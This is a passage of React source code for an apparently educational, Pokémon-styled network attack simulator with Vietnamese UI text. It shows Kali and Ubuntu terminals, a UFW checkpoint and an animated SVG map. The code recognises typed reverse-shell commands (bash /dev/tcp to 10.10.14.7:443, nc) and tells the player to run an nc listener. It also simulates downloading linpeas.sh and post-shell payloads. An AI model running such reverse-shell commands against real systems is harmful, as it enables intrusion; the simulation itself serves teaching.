        kind: 'download',
      });
      pushKaliEvent('10.10.14.30 vừa tải xong linpeas.sh (200 OK).', 'good');
      setKaliLines((prev) => [
        ...prev,
        { text: '10.10.14.30 - - "GET /linpeas.sh HTTP/1.1" 200 - (842 KB)', tone: 'good' },
      ]);
      pushTargetEvent('Đã lưu /tmp/linpeas.sh từ 10.10.14.7:8000.', 'good');
      return addOut('100  842k  100  842k  --  Đã lưu tại /tmp/linpeas.sh', 'good');
    }

    if ((cmd.includes('/dev/tcp/10.10.14.7/443') || (cmd.includes('nc') && cmd.includes('10.10.14.7') && cmd.includes('443')))) {
      if (lab.listener443 === 'off') {
        emitPacket({
          dir: 'roundtrip-left',
          label: 'REVERSE SHELL THẤT BẠI',
          detail: 'Ubuntu gọi về Kali :443 bị từ chối (RST) vì bên Kali chưa mở `nc -lvnp 443` chờ hứng kết nối.',
          tone: 'bad',
          kind: 'refused',
        });
        pushKaliEvent('10.10.14.30 gọi :443 nhưng Kali chưa mở nc.', 'warn');
        setKaliLines((prev) => [
          ...prev,
          { text: '[mạng] 10.10.14.30 gọi về :443 nhưng Kali chưa bật `nc -lvnp 443`.', tone: 'warn' },
        ]);
        return addOut('bash: connect: Connection refused\n(Bấm sang KALI chạy `nc -lvnp 443` trước!)', 'bad');
      }
      clearTimers();
      setLab((s) => {
        const nextDone = new Set(s.done);
        nextDone.add('shell');
        return { ...s, listener443: 'connected', done: nextDone };
      });
      emitPacket({
        dir: 'left',
        label: 'ĐÀO HẦM :443 THÀNH CÔNG!',
        detail: 'Ubuntu tự mở đường hầm ngược dưới cầu về Kali :443 (vượt tường lửa chiều ra) — Hacker đã chiếm quyền và đang tung payload!',
        tone: 'good',
        kind: 'shell',
      });
      pushUfwEvent('OUTBOUND ALLOW: 10.10.14.30 → 10.10.14.7:443 (đi ra tự do).', 'warn');
      pushKaliEvent('Bắt được reverse shell từ 10.10.14.30!', 'good');
      setKaliLines((prev) => [
        ...prev,
        {
          text: 'connect to [10.10.14.7] from [10.10.14.30] 51842\nwww-data@target:/$ (Đã chiếm shell! Đang tự động mô phỏng hậu quả trên nạn nhân — thử thêm `whoami`, `id`, `ls /tmp` hoặc `+ phát tán payload`)',
          tone: 'good',
        },
      ]);
      pushTargetEvent('Tiến trình bash đã nối ngược tới 10.10.14.7:443.', 'warn');
      const t1 = window.setTimeout(() => triggerPostShellPayload(), 850);
      timersRef.current.push(t1);
      return addOut('[đang giữ kết nối reverse shell tới 10.10.14.7:443...]', 'good');
    }

    addOut(`Chưa hỗ trợ lệnh "${cmd}" trong mẫu thử. Gõ \`help\` để xem lệnh.`, 'warn');
  }

  function handleKeyDown(
    e: KeyboardEvent<HTMLInputElement>,
    hist: string[],
    hi: number,
    setHi: (v: number) => void,
    setInput: (v: string) => void,
  ) {
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (!hist.length) return;
      const next = Math.min(hi + 1, hist.length - 1);
      setHi(next);
      setInput(hist[next]);
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      const next = hi - 1;
      setHi(next);
      setInput(next >= 0 ? hist[next] : '');
    }
  }

  function reset() {
    clearTimers();
    setHackerJumping(false);
    setRemoteCmdText(null);
    setLab(INITIAL_STATE());
    setKaliLines([{ text: 'KALI-OS v2026 (10.10.14.7). Gõ `help` hoặc bấm phím lệnh bên dưới.' }]);
    setTargetLines([{ text: 'UBUNTU SERVER (10.10.14.30). Gõ `help` để xem danh sách lệnh.' }]);
    setKaliEvents([{ time: nowTag(), msg: 'Trạm Kali sẵn sàng ngoài mạng đích.', tone: 'normal' }]);
    setTargetEvents([{ time: nowTag(), msg: 'sshd(:22), nginx(:80), smbd(:445) đang chạy.', tone: 'normal' }]);
    setUnread({ kali: 0, target: 0, ufw: 0 });
    emitPacket({
      dir: 'both',
      label: 'NHẬT KÝ CHIẾN TRƯỜNG',
      detail: 'Ván chơi đã đặt lại! Chọn trạm trên bản đồ để mở CRT — manh mối và kết quả chiếm quyền sẽ hiện tại đây.',
      tone: 'accent',
      kind: 'idle',
    });
    setKaliInput('');
    setTargetInput('');
  }

  const p80 = port80State(lab);
  const kaliSelected = panel === 'kali' || panel === 'both';
  const targetSelected = panel === 'target' || panel === 'both';
  const ufwSelected = panel === 'ufw';

  function renderGbaMap(interactive: boolean) {
    return (
      <svg
        className="gba-map"
        viewBox="0 0 880 264"
        shapeRendering="crispEdges"
        role="img"
        aria-label="Sơ đồ mô phỏng mạng tương tác: Trạm Kali, Chốt UFW và Máy chủ Ubuntu"
      >
        <defs>
          {/* Tile cỏ Pokémon Gen 3 với bụi lá & điểm sáng */}
          <pattern id="poke-grass" width="16" height="16" patternUnits="userSpaceOnUse">
            <rect width="16" height="16" fill="#64bc54" />
            <rect x="2" y="4" width="4" height="2" fill="#4e9c3e" />
            <rect x="4" y="2" width="2" height="2" fill="#7cd86a" />
            <rect x="10" y="10" width="4" height="2" fill="#4e9c3e" />
            <rect x="12" y="12" width="2" height="2" fill="#3a802e" />
            <rect x="10" y="2" width="2" height="2" fill="#7cd86a" />
          </pattern>

          {/* Tile cỏ cao (Tall Grass) ven đường Pokémon */}
          <pattern id="poke-tallgrass" width="12" height="12" patternUnits="userSpaceOnUse">
            <rect width="12" height="12" fill="#489838" />
            <rect x="1" y="2" width="3" height="8" fill="#286424" />
            <rect x="2" y="1" width="2" height="6" fill="#6cc854" />
            <rect x="7" y="3" width="3" height="7" fill="#286424" />
            <rect x="8" y="2" width="2" height="6" fill="#6cc854" />
            <rect x="0" y="10" width="12" height="2" fill="#204c1c" />
          </pattern>

          {/* Tile nước sông Hoenn nhiều tầng sóng */}
          <pattern id="poke-water" width="24" height="24" patternUnits="userSpaceOnUse">
            <rect width="24" height="24" fill="#3c84d8" />
            <rect x="2" y="4" width="8" height="2" fill="#5ca8f4" />
            <rect x="4" y="4" width="4" height="2" fill="#9cd4ff" />
            <rect x="14" y="12" width="8" height="2" fill="#2b68b4" />
            <rect x="12" y="18" width="10" height="2" fill="#5ca8f4" />
            <rect x="16" y="18" width="4" height="2" fill="#b8e8ff" />
          </pattern>

          {/* Tile đường cát Route Pokémon */}
          <pattern id="poke-sand" width="16" height="16" patternUnits="userSpaceOnUse">
            <rect width="16" height="16" fill="#e4cc88" />
            <rect x="2" y="4" width="4" height="2" fill="#f4e0a4" />
            <rect x="10" y="10" width="2" height="2" fill="#c4a664" />
            <rect x="6" y="12" width="4" height="2" fill="#d4b878" />
          </pattern>

          {/* Tile sàn gỗ cabin Kali */}
          <pattern id="poke-porch" width="16" height="16" patternUnits="userSpaceOnUse">
            <rect width="16" height="16" fill="#d8b67c" />
            <rect x="0" y="0" width="16" height="2" fill="#e6ca96" />
            <rect x="0" y="14" width="16" height="2" fill="#b89258" />
            <rect x="7" y="2" width="2" height="12" fill="#c49e64" />
          </pattern>

          {/* Tile gạch phòng máy Silph Co. / Poké-Center 2.5D */}
          <pattern id="poke-silph" width="24" height="24" patternUnits="userSpaceOnUse">
            <rect width="24" height="24" fill="#d8e6f6" />
            <rect x="0" y="0" width="12" height="12" fill="#eef6ff" />
            <rect x="12" y="12" width="12" height="12" fill="#eef6ff" />
            <rect x="0" y="11" width="24" height="1" fill="#a8bed8" />
            <rect x="0" y="23" width="24" height="1" fill="#a8bed8" />
            <rect x="11" y="0" width="1" height="24" fill="#a8bed8" />
            <rect x="23" y="0" width="1" height="24" fill="#a8bed8" />
          </pattern>

          {/* Tile ván cầu gỗ */}
          <pattern id="poke-bridge" width="16" height="68" patternUnits="userSpaceOnUse">
            <rect width="16" height="68" fill="#b87434" />
            <rect x="2" y="0" width="12" height="68" fill="#c88644" />
            <rect x="14" y="0" width="2" height="68" fill="#7c481c" />
            <rect x="4" y="8" width="2" height="2" fill="#583010" />
            <rect x="4" y="56" width="2" height="2" fill="#583010" />
            <rect x="10" y="26" width="2" height="14" fill="#b47030" />
          </pattern>
        </defs>

        {/* === 1. VÙNG TRÁI: ROUTE 1 & NHÀ LAB CỦA TRAINER KALI === */}
        <rect x="0" y="0" width="320" height="264" fill="url(#poke-grass)" />

        {/* Cỏ cao Pokémon ven bờ và chân map */}
        <rect x="48" y="226" width="212" height="24" fill="url(#poke-tallgrass)" />
        <rect x="52" y="34" width="84" height="12" fill="url(#poke-tallgrass)" />

        {/* Vách đá 2.5D dọc bờ sông trái */}
        <rect x="304" y="0" width="16" height="114" fill="#58a444" />
        <rect x="312" y="0" width="8" height="114" fill="#987444" />
        <rect x="316" y="0" width="4" height="114" fill="#684c28" />
        <rect x="304" y="182" width="16" height="82" fill="#58a444" />
        <rect x="312" y="182" width="8" height="82" fill="#987444" />
        <rect x="316" y="182" width="4" height="82" fill="#684c28" />

        {/* Đường cát Route 1 dẫn ra cầu */}
        <rect x="18" y="122" width="302" height="52" fill="#b49456" />
        <rect x="22" y="126" width="298" height="44" fill="url(#poke-sand)" />

        {/* Cụm cây sồi mật độ pixel cao + hoa dại Pokémon */}
        <PixelSprite x={2} y={4} px={2} rows={TREE_ROWS} palette={TREE_PAL} />
        <PixelSprite x={270} y={4} px={2} rows={TREE_ROWS} palette={TREE_PAL} />
        <PixelSprite x={2} y={216} px={2} rows={TREE_ROWS} palette={TREE_PAL} />
        <PixelSprite x={268} y={216} px={2} rows={TREE_ROWS} palette={TREE_PAL} />
        <PixelSprite x={54} y={232} px={2} rows={FLOWER_ROWS} palette={FLOWER_PAL} />
        <PixelSprite x={102} y={236} px={2} rows={FLOWER_ROWS} palette={FLOWER_PAL} />
        <PixelSprite x={218} y={232} px={2} rows={FLOWER_ROWS} palette={FLOWER_PAL} />

        {/* Hiên nhà Lab Kali có viền gỗ 2.5D & bóng đổ */}
        <rect x="38" y="46" width="248" height="176" fill="#242c24" opacity="0.35" />
        <rect x="34" y="44" width="248" height="174" fill="#2c241c" />
        <rect x="36" y="46" width="244" height="170" fill="#a87038" />
        <rect x="40" y="50" width="236" height="162" fill="url(#poke-porch)" />
        {/* Thềm bậc bước ra đường đất */}
        <rect x="276" y="128" width="8" height="40" fill="#885828" />
        <rect x="276" y="132" width="6" height="32" fill="#d8a868" />

        {/* === 2. VÙNG GIỮA: SÔNG HOENN & CẦU GỖ 2.5D === */}
        <rect x="320" y="0" width="240" height="264" fill="url(#poke-water)" />
        {/* Bọt nước vỗ bờ trái/phải */}
        <rect x="320" y="0" width="4" height="114" fill="#a8e0ff" />
        <rect x="324" y="16" width="2" height="72" fill="#ffffff" opacity="0.7" />
        <rect x="556" y="0" width="4" height="114" fill="#a8e0ff" />
        <rect x="554" y="24" width="2" height="68" fill="#ffffff" opacity="0.7" />
        <rect x="320" y="182" width="4" height="82" fill="#a8e0ff" />
        <rect x="556" y="182" width="4" height="82" fill="#a8e0ff" />

        {/* Bóng cầu đổ xuống mặt nước */}
        <rect x="320" y="184" width="240" height="12" fill="#183868" opacity="0.45" />

        {/* Cầu gỗ ván bắc qua sông */}
        <rect x="316" y="110" width="248" height="76" fill="#462610" />
        <rect x="316" y="114" width="248" height="68" fill="url(#poke-bridge)" />
        {/* Lan can gỗ có trụ nổi 2.5D */}
        <rect x="316" y="108" width="248" height="8" fill="#683818" />
        <rect x="316" y="110" width="248" height="4" fill="#e0a458" />
        <rect x="316" y="178" width="248" height="8" fill="#582e12" />
        <rect x="316" y="178" width="248" height="3" fill="#c07c3c" />
        {[324, 364, 404, 472, 512, 548].map((px) => (
          <g key={px}>
            <rect x={px} y="104" width="6" height="12" fill="#683818" />
            <rect x={px + 1} y="105" width="4" height="4" fill="#f0ba70" />
            <rect x={px} y="176" width="6" height="12" fill="#683818" />
            <rect x={px + 1} y="177" width="4" height="4" fill="#d8944c" />
          </g>
        ))}

        {/* === 3. VÙNG PHẢI: SILPH CO. / POKÉ-CENTER DMZ === */}
        <rect x="560" y="0" width="320" height="264" fill="url(#poke-grass)" />
        {/* Bờ đá ngăn nước phải */}
        <rect x="560" y="0" width="12" height="114" fill="#8898b0" />
        <rect x="560" y="0" width="4" height="114" fill="#586478" />
        <rect x="560" y="182" width="12" height="82" fill="#8898b0" />
        <rect x="560" y="182" width="4" height="82" fill="#586478" />

        {/* Sân đá lát trước cửa tòa nhà DMZ */}
        <rect x="564" y="122" width="30" height="52" fill="#6c7c94" />
        <rect x="564" y="126" width="28" height="44" fill="#b4c4d8" />

        {/* Cây xanh góc ngoài tòa nhà DMZ */}
        <PixelSprite x={566} y={2} px={2} rows={TREE_ROWS} palette={TREE_PAL} />
        <PixelSprite x={838} y={2} px={2} rows={TREE_ROWS} palette={TREE_PAL} />
        <PixelSprite x={566} y={220} px={2} rows={TREE_ROWS} palette={TREE_PAL} />
        <PixelSprite x={838} y={220} px={2} rows={TREE_ROWS} palette={TREE_PAL} />

        {/* Tòa nhà Silph Co. DMZ cutaway 2.5D với mái ngói xanh & tường nội thất */}
        <rect x="594" y="42" width="272" height="184" fill="#1c2432" opacity="0.4" />
        <rect x="590" y="38" width="270" height="184" fill="#1c2436" />
        {/* Mái xanh Poké-Mart / Silph Co. nhiều dải bóng */}
        <rect x="592" y="40" width="266" height="14" fill="#2858a0" />
        <rect x="592" y="40" width="266" height="4" fill="#68a4f0" />
        <rect x="592" y="50" width="266" height="4" fill="#1c3c74" />
        {/* Tường nội thất & viền chân tường */}
        <rect x="592" y="54" width="266" height="12" fill="#98b0cc" />
        <rect x="592" y="64" width="266" height="4" fill="#7088a8" />
        {/* Sàn gạch 2.5D */}
        <rect x="592" y="68" width="266" height="152" fill="url(#poke-silph)" />
        {/* Cây cảnh Poké-Center góc phòng */}
        <PixelSprite x={832} y={70} px={2} rows={PLANT_ROWS} palette={PLANT_PAL} />
        {/* Poké Ball chìm tinh tế ở giữa sàn phòng máy */}
        <g opacity="0.32">
          <PixelSprite x={706} y={102} px={3} rows={POKEBALL_ROWS} palette={{ O: '#607898', R: '#d87070', W: '#ffffff' }} />
        </g>

        {/* Bảng tên khu vực kiểu Route Sign GBA FireRed */}
        <rect x="44" y="10" width="222" height="24" fill="#182030" />
        <rect x="46" y="12" width="218" height="20" fill="#f8f8f0" />
        <rect x="46" y="12" width="8" height="20" fill="#e03428" />
        <rect x="54" y="12" width="2" height="20" fill="#b02018" />
        <text x="160" y="25" textAnchor="middle" className="gba-zone-txt">NGOÀI MẠNG · KALI</text>

        <rect x="614" y="10" width="222" height="24" fill="#182030" />
        <rect x="616" y="12" width="218" height="20" fill="#f8f8f0" />
        <rect x="616" y="12" width="8" height="20" fill="#2864b8" />
        <rect x="624" y="12" width="2" height="20" fill="#1c4484" />
        <text x="730" y="25" textAnchor="middle" className="gba-zone-txt">VÙNG DMZ · MỤC TIÊU</text>

        {/* === ĐỐI TƯỢNG 1: HACKER & TRẠM MÁY KALI === */}
        <g
          className={interactive ? `gba-obj ${kaliSelected ? 'is-selected' : ''}` : ''}
          onClick={interactive ? () => openNode('kali') : undefined}
          role={interactive ? 'button' : undefined}
          tabIndex={interactive ? 0 : undefined}
          aria-label={interactive ? 'Bấm để mở màn hình CRT của Kali Linux' : undefined}
          onKeyDown={interactive ? (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); openNode('kali'); } } : undefined}
        >
          <rect x="38" y="48" width="240" height="166" fill="transparent" className="gba-hit-box" />

          {/* Bàn gỗ 2.5D có bóng đổ */}
          <rect x="108" y="168" width="118" height="6" fill="#9c7a48" />
          <rect x="106" y="132" width="118" height="16" fill="#683818" />
          <rect x="108" y="134" width="114" height="6" fill="#dc9854" />
          <rect x="108" y="140" width="114" height="6" fill="#b46c34" />
          <rect x="114" y="148" width="10" height="22" fill="#542c12" />
          <rect x="206" y="148" width="10" height="22" fill="#542c12" />

          {/* Sprite Hacker áo hoodie tối màu + kính xanh terminal (nhảy liên tục khi đã chiếm shell) */}
          <rect
            x="64"
            y="156"
            width="28"
            height="6"
            fill="#9c7a48"
            className={lab.listener443 === 'connected' || hackerJumping ? 'gba-hacker-shadow' : ''}
          />
          <g className={lab.listener443 === 'connected' || hackerJumping ? 'gba-hacker-jump' : ''}>
            <PixelSprite x={62} y={122} px={2} rows={HACKER_ROWS} palette={HACKER_PAL} />
          </g>
          {lab.listener443 === 'connected' && (
            <g className="gba-win-sparks">
              <rect x="54" y="106" width="4" height="4" fill="#ffe66d" />
              <rect x="96" y="102" width="4" height="4" fill="#5cff96" />
              <rect x="76" y="96" width="4" height="4" fill="#ffe66d" />
            </g>
          )}

          {/* Màn hình CRT xanh chi tiết trên bàn Kali */}
          <rect x="122" y="80" width="66" height="50" fill="#1c222c" />
          <rect x="124" y="82" width="62" height="44" fill="#e6dec6" />
          <rect x="124" y="82" width="62" height="4" fill="#f8f2e0" />
          <rect x="128" y="86" width="54" height="36" fill="#242830" />
          <rect x="132" y="90" width="46" height="28" fill="#0c2616" />
          <rect x="135" y="93" width="24" height="3" fill="#46e87c" />
          <rect x="135" y="99" width="38" height="3" fill="#2cb058" />
          <rect x="135" y="105" width="16" height="3" fill="#46e87c" />
          <rect x="155" y="105" width="5" height="4" fill="#99ffbb" />
          <rect x="142" y="126" width="26" height="6" fill="#aba28a" />
          {/* Bàn phím pixel có dãy phím */}
          <rect x="128" y="136" width="54" height="8" fill="#e8e2d0" />
          <rect x="130" y="138" width="50" height="2" fill="#989080" />

          {/* Trạm ăng-ten PokéGear bên cạnh */}
          <rect x="234" y="76" width="8" height="74" fill="#1c222c" />
          <rect x="236" y="78" width="4" height="70" fill="#98a8c0" />
          <rect x="230" y="148" width="16" height="10" fill="#445064" />
          <rect x="228" y="66" width="20" height="12" fill={lab.listener443 !== 'off' || lab.httpServer ? '#46e87c' : '#687890'} />
          {(lab.listener443 !== 'off' || lab.httpServer) && (
            <>
              <rect x="220" y="60" width="4" height="14" fill="#5cff96" />
              <rect x="252" y="60" width="4" height="14" fill="#5cff96" />
            </>
          )}

          {/* Bảng chỉ số KALI */}
          <rect x="46" y="182" width="224" height="28" fill="#18222e" />
          <rect x="48" y="184" width="220" height="24" fill="#243242" />
          <text x="56" y="199" className="gba-px-title">KALI 10.10.14.7</text>
          <rect x="174" y="188" width="40" height="16" fill={lab.httpServer ? '#256b40' : '#3a424d'} />
          <text x="194" y="199" textAnchor="middle" className="gba-px-chip">:8000</text>
          <rect x="218" y="188" width="44" height="16" fill={lab.listener443 === 'connected' ? '#258a4c' : lab.listener443 === 'listening' ? '#8c6918' : '#3a424d'} />
          <text x="240" y="199" textAnchor="middle" className="gba-px-chip">:443</text>

          {interactive && (
            <text x="158" y="68" textAnchor="middle" className="gba-cursor-hint">
              {kaliSelected ? '▼ ĐANG MỞ CRT KALI' : '▸ BẤM MỞ CRT KALI'}
            </text>
          )}
          {interactive && unread.kali > 0 && (
            <g className="gba-alert-bubble">
              <rect x="240" y="42" width="34" height="22" fill="#18222e" />
              <rect x="242" y="44" width="30" height="18" fill="#f8f8f0" />
              <text x="257" y="57" textAnchor="middle" className="gba-poke-excl">!{unread.kali}</text>
            </g>
          )}
        </g>

        {/* === ĐỐI TƯỢNG 2: CHỐT CẢNH SÁT UFW TRÊN CẦU === */}
        <g
          className={interactive ? `gba-obj ${ufwSelected ? 'is-selected' : ''}` : ''}
          onClick={interactive ? () => openNode('ufw') : undefined}
          role={interactive ? 'button' : undefined}
          tabIndex={interactive ? 0 : undefined}
          aria-label={interactive ? 'Bấm để mở màn hình tường lửa UFW' : undefined}
          onKeyDown={interactive ? (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); openNode('ufw'); } } : undefined}
        >
          <rect x="394" y="46" width="92" height="168" fill="transparent" className="gba-hit-box" />

          {/* Bốt gác Officer Jenny có mái ngói 2.5D & nhân vật cảnh sát mật độ cao */}
          <rect x="412" y="106" width="56" height="6" fill="#203860" opacity="0.45" />
          <rect x="410" y="52" width="60" height="58" fill="#1c2434" />
          <rect x="412" y="54" width="56" height="14" fill="#2c60b0" />
          <rect x="412" y="54" width="56" height="4" fill="#5c98e8" />
          <rect x="412" y="68" width="56" height="40" fill="#eef4fc" />
          <rect x="418" y="72" width="44" height="32" fill={lab.fwBlock80 ? '#742020' : '#1b5a34'} />
          <PixelSprite x={426} y={76} px={2} rows={OFFICER_ROWS} palette={OFFICER_PAL} />

          {/* Thanh chắn Pokémon Roadblock trên cầu (:80) */}
          {lab.fwBlock80 ? (
            <g>
              <rect x="430" y="114" width="20" height="70" fill="#182030" />
              <rect x="433" y="116" width="14" height="12" fill="#e83830" />
              <rect x="433" y="128" width="14" height="12" fill="#f8f8f0" />
              <rect x="433" y="140" width="14" height="12" fill="#e83830" />
              <rect x="433" y="152" width="14" height="12" fill="#f8f8f0" />
              <rect x="433" y="164" width="14" height="18" fill="#e83830" />
              <rect x="434" y="116" width="3" height="66" fill="#ffffff" opacity="0.3" />
            </g>
          ) : (
            <g>
              <rect x="434" y="112" width="12" height="12" fill="#2a8c4e" />
              <rect x="436" y="114" width="8" height="4" fill="#5cf094" />
              <rect x="434" y="174" width="12" height="12" fill="#2a8c4e" />
              <rect x="436" y="176" width="8" height="4" fill="#5cf094" />
            </g>
          )}

          {/* Bảng trạng thái UFW dưới cầu */}
          <rect x="398" y="192" width="84" height="26" fill="#18222e" />
          <rect x="400" y="194" width="80" height="22" fill={lab.fwBlock80 ? '#6e2020' : '#243242'} />
          <text x="440" y="209" textAnchor="middle" className="gba-px-title">
            {lab.fwBlock80 ? 'UFW CHẶN' : 'UFW MỞ'}
          </text>

          {interactive && (
            <text x="440" y="42" textAnchor="middle" className="gba-cursor-hint">
              {ufwSelected ? '▼ CRT UFW' : '▸ UFW'}
            </text>
          )}
          {interactive && unread.ufw > 0 && (
            <g className="gba-alert-bubble">
              <rect x="462" y="44" width="30" height="22" fill="#18222e" />
              <rect x="464" y="46" width="26" height="18" fill="#f8f8f0" />
              <text x="477" y="59" textAnchor="middle" className="gba-poke-excl">!{unread.ufw}</text>
            </g>
          )}
        </g>

        {/* === ĐỐI TƯỢNG 3: HỆ THỐNG MÁY CHỦ SILPH CO. (UBUNTU DMZ) === */}
        <g
          className={interactive ? `gba-obj ${targetSelected ? 'is-selected' : ''}` : ''}
          onClick={interactive ? () => openNode('target') : undefined}
          role={interactive ? 'button' : undefined}
          tabIndex={interactive ? 0 : undefined}
          aria-label={interactive ? 'Bấm để mở màn hình CRT của Ubuntu Web' : undefined}
          onKeyDown={interactive ? (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); openNode('target'); } } : undefined}
        >
          <rect x="598" y="52" width="254" height="164" fill="transparent" className="gba-hit-box" />

          {/* Tủ Bill's PC / Silph Mainframe 2.5D có bóng sàn */}
          <rect x="616" y="172" width="76" height="6" fill="#889eb8" />
          <rect x="616" y="74" width="72" height="100" fill="#1c2434" />
          <rect x="620" y="78" width="64" height="92" fill="#3e506c" />
          <rect x="620" y="78" width="64" height="4" fill="#7088ac" />
          {[
            { port: 22, y: 84, color: '#46e87c' },
            { port: 80, y: 106, color: p80 === 'open' ? '#46e87c' : p80 === 'filtered' ? '#ffb84d' : '#ff4d4d' },
            { port: 81, y: 128, color: '#ff4d4d' },
            { port: 445, y: 150, color: '#46e87c' },
          ].map((led) => (
            <g key={led.port} className={pulsePorts.includes(led.port) ? 'gba-led-pulse' : ''}>
              <rect x="626" y={led.y} width="52" height="16" fill="#16202c" />
              <rect x="630" y={led.y + 4} width="8" height="8" fill={led.color} />
              <rect x="630" y={led.y + 4} width="3" height="3" fill="#ffffff" opacity="0.65" />
              <text x="644" y={led.y + 12} className="gba-port-txt">:{led.port}</text>
            </g>
          ))}

          {/* Quầy Silph Co. & Màn hình CRT hổ phách */}
          <rect x="706" y="168" width="128" height="6" fill="#889eb8" />
          <rect x="704" y="136" width="128" height="18" fill="#465670" />
          <rect x="704" y="136" width="128" height="5" fill="#88a0c0" />
          <rect x="712" y="154" width="10" height="18" fill="#343c4c" />
          <rect x="812" y="154" width="10" height="18" fill="#343c4c" />

          <rect x="722" y="80" width="68" height="52" fill="#1c222c" />
          <rect x="724" y="82" width="64" height="48" fill="#e6dec6" />
          <rect x="724" y="82" width="64" height="4" fill="#f8f2e0" />
          <rect x="728" y="86" width="56" height="38" fill="#242830" />
          {lab.compromised ? (
            <g className="gba-red-screen">
              {/* Màn hình đỏ báo động / mã hóa sau khi dính payload */}
              <rect x="732" y="90" width="48" height="30" fill="#7a0b10" />
              <rect x="735" y="93" width="42" height="4" fill="#ff4d4d" />
              <rect x="746" y="100" width="20" height="3" fill="#ffd2d2" />
              <rect x="752" y="104" width="8" height="6" fill="#ff4d4d" />
              <rect x="740" y="113" width="32" height="3" fill="#ff7373" />
              {/* Đèn còi báo động đỏ trên tường phòng server */}
              <rect x="694" y="58" width="12" height="8" fill="#ff3b3b" className="gba-alarm-beacon" />
            </g>
          ) : (
            <g>
              <rect x="732" y="90" width="48" height="30" fill="#261808" />
              <rect x="736" y="94" width="30" height="3" fill="#ffb84d" />
              <rect x="736" y="100" width="38" height="3" fill="#d48c28" />
              <rect x="736" y="106" width="18" height="3" fill="#ffb84d" />
            </g>
          )}

          {/* Poké Ball pixel mượt xuất hiện khi tải xong linpeas.sh */}
          {lab.targetHasLinpeas && (
            <PixelSprite x={798} y={114} px={2} rows={POKEBALL_ROWS} palette={POKEBALL_PAL} />
          )}

          {/* Bảng tên pixel UBUNTU */}
          <rect x="612" y="182" width="224" height="28" fill="#18222e" />
          <rect x="614" y="184" width="220" height="24" fill={lab.compromised ? '#4d1418' : '#243242'} />
          <text x="622" y="199" className="gba-px-title">UBUNTU 10.10.14.30</text>
          <rect
            x="772"
            y="188"
            width="56"
            height="16"
            fill={lab.compromised ? '#b81d24' : p80 === 'open' ? '#256b40' : p80 === 'filtered' ? '#8c5a18' : '#7a2525'}
          />
          <text x="800" y="199" textAnchor="middle" className="gba-px-chip">
            {lab.compromised ? 'PWNED!' : p80 === 'open' ? '80:MỞ' : p80 === 'filtered' ? '80:LỌC' : '80:TẮT'}
          </text>

          {interactive && (
            <text x="724" y="49" textAnchor="middle" className="gba-cursor-hint">
              {targetSelected ? '▼ ĐANG MỞ CRT VICTIM' : '▸ BẤM MỞ CRT VICTIM'}
            </text>
          )}
          {interactive && unread.target > 0 && (
            <g className="gba-alert-bubble">
              <rect x="812" y="42" width="34" height="22" fill="#18222e" />
              <rect x="814" y="44" width="30" height="18" fill="#f8f8f0" />
              <text x="829" y="57" textAnchor="middle" className="gba-poke-excl">!{unread.target}</text>
            </g>
          )}
        </g>

        {/* === ĐƯỜNG HẦM NGẦM REVERSE SHELL (:443) VƯỢT DƯỚI CHÂN CẦU UFW === */}
        {lab.listener443 === 'connected' && (
          <g className="gba-tunnel-group">
            {/* Thân ống đường hầm ngầm nối cổng Kali :443 <-> máy Ubuntu */}
            <path
              d="M 628 210 L 628 228 Q 628 240 614 240 L 254 240 Q 240 240 240 228 L 240 210"
              fill="none"
              stroke="#0d1118"
              strokeWidth="18"
              strokeLinejoin="round"
            />
            <path
              d="M 628 210 L 628 228 Q 628 240 614 240 L 254 240 Q 240 240 240 228 L 240 210"
              fill="none"
              stroke="#3b4f6b"
              strokeWidth="13"
              strokeLinejoin="round"
            />
            <path
              d="M 628 210 L 628 228 Q 628 240 614 240 L 254 240 Q 240 240 240 228 L 240 210"
              fill="none"
              stroke="#6884aa"
              strokeWidth="11"
              strokeDasharray="3 12"
              strokeLinejoin="round"
            />
            <path
              d="M 628 210 L 628 228 Q 628 240 614 240 L 254 240 Q 240 240 240 228 L 240 210"
              fill="none"
              stroke="#072214"
              strokeWidth="8"
              strokeLinejoin="round"
            />
            {/* Dòng tín hiệu xanh neon chảy liên tục trong lòng ống hầm */}
            <path
              d="M 628 210 L 628 228 Q 628 240 614 240 L 254 240 Q 240 240 240 228 L 240 210"
              className="gba-tunnel-flow"
              fill="none"
            />

            {/* Các viên dữ liệu pixel chạy xuyên qua đường hầm ngầm */}
            {[0, 0.7, 1.4].map((delay, idx) => (
              <rect
                key={idx}
                x="-4"
                y="-3"
                width="8"
                height="6"
                rx="1"
                fill={idx === 1 ? '#ffe66d' : '#99ffbb'}
                stroke="#0d1118"
                strokeWidth="1"
              >
                <animateMotion
                  dur="2.1s"
                  begin={`${delay}s`}
                  repeatCount="indefinite"
                  path="M 628 210 L 628 228 Q 628 240 614 240 L 254 240 Q 240 240 240 228 L 240 210"
                />
              </rect>
            ))}

            {/* Khớp nối cổng hầm thép ở 2 đầu trạm Kali (:443) và Ubuntu */}
            <rect x="226" y="206" width="28" height="8" fill="#0d1118" />
            <rect x="228" y="208" width="24" height="4" fill="#46e87c" />
            <rect x="614" y="206" width="28" height="8" fill="#0d1118" />
            <rect x="616" y="208" width="24" height="4" fill="#46e87c" />

            {/* Biển hiệu nút giao đường hầm ngay dưới chốt UFW */}
            <rect x="366" y="229" width="148" height="22" fill="#0d1118" className="gba-tunnel-sign" />
            <rect x="368" y="231" width="144" height="18" fill="#0d2917" />
            <rect x="372" y="237" width="6" height="6" fill="#5cff96" />
            <text x="444" y="243" textAnchor="middle" className="gba-tunnel-lbl">◀◀ TUNNEL :443</text>

            {/* Biểu tượng điều khiển từ xa trên màn hình Ubuntu */}
            <g className="gba-remote-hud">
              <rect x="712" y="56" width="96" height="19" fill="#0d1118" />
              <rect x="714" y="58" width="92" height="15" fill="#0d2917" />
              <rect x="718" y="63" width="4" height="4" fill="#46e87c" />
              <rect x="724" y="63" width="4" height="4" fill="#46e87c" />
              <text x="766" y="69" textAnchor="middle" className="gba-ctrl-txt">KALI CTRL</text>
            </g>
            {remoteCmdText && (
              <g className="gba-remote-exec">
                <rect x="700" y="114" width="112" height="18" fill="#0d1118" />
                <rect x="702" y="116" width="108" height="14" fill="#46e87c" />
                <text x="756" y="126" textAnchor="middle" className="gba-ctrl-cmd">$ {remoteCmdText}</text>
              </g>
            )}
          </g>
        )}

